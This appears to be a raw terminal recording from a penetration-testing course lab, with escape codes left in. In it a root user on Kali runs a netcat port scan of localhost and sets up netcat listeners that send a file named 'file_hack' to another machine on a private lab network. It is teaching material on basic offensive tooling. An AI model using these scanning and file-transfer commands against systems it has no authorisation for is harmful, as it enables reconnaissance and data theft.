+(UNKNOWN) [127.0.0.1] 4 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 3 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 2 (?) : Connection refused
+(UNKNOWN) [127.0.0.1] 1 (tcpmux) : Connection refused
+ sent 0, rcvd 0
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# nc -z -vv -n 127.0.0.1 1-30[1P
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ll
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ll
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ls
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# touch file
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ll
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ls
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# cat file | nc -[K-vv -l -p 4567[K[K[K[K12234[K[K[K34
+listening on [any] 1234 ...
+^C sent 0, rcvd 0
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# mv file file_hack
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ll
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# llmv file file_hackcat file | nc -vv -l -p 1234[C[5@_hack
+listening on [any] 1234 ...
+192.168.58.129: inverse host lookup failed: Unknown host
+connect to [192.168.58.128] from (UNKNOWN) [192.168.58.129] 56580
+too many output retries : Broken pipe
+ sent 0, rcvd 0 : Broken pipe
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# cat file_hack | nc -vv -l -p 1234
+listening on [any] 1234 ...
+192.168.58.129: inverse host lookup failed: Unknown host
+connect to [192.168.58.128] from (UNKNOWN) [192.168.58.129] 56581
+too many output retries : Broken pipe
+ sent 0, rcvd 0 : Broken pipe
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ifconfig
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# /bin/bash
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ll
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# exit
+exit
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# 
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# ll
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# exit
+exit
+]0;root@kali: ~/Corso_PT/Day_2[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_2[00m# exit
+exit
+
+Script done on 2019-11-26 10:42:04-05:00 [COMMAND_EXIT_CODE="0"]
